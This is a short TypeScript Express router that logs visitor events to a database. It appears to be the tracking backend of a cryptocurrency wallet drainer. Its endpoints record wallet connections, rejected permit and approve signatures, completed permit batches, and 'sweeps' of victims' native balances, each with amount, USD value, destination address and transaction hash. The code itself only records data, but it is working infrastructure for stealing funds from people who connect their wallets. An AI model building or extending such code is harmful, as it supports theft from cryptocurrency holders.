import { Router } from "express";
import { db } from "../db";
const router = Router();
const insertEvent = db.prepare("INSERT INTO events (kind, visitor_id, address, payload) VALUES (?,?,?,?)");
function log(kind: string, body: any) { insertEvent.run(kind, body.visitorId ?? null, body.owner ?? body.address ?? null, JSON.stringify(body)); }
router.post("/visit", (req, res) => { log("visit", req.body); res.json({ ok: true }); });
router.post("/wallet-connected", (req, res) => { log("wallet_connected", req.body); res.json({ ok: true }); });
router.post("/tx-proposed", (req, res) => { log("tx_proposed", req.body); res.json({ ok: true }); });
router.post("/permit-rejected", (req, res) => { log("permit_rejected", req.body); res.json({ ok: true }); });
router.post("/permit-batch-done", (req, res) => { log("permit_batch_done", req.body); res.json({ ok: true }); });
router.post("/approve-rejected", (req, res) => { log("approve_rejected", req.body); res.json({ ok: true }); });
router.post("/sweep", (req, res) => {
  const b = req.body ?? {};
  db.prepare(`INSERT INTO sweeps (chain_id, owner, native_symbol, amount, amount_usd, to_addr, status, reason, tx_hash, visitor_id) VALUES (?,?,?,?,?,?,?,?,?,?)`).run(b.chainId, b.owner, b.nativeSymbol ?? null, b.amount ?? null, b.amountUsd ?? null, b.to ?? "", b.status ?? "unknown", b.reason ?? null, b.txHash ?? null, b.visitorId ?? null);
  res.json({ ok: true });
});
export default router;
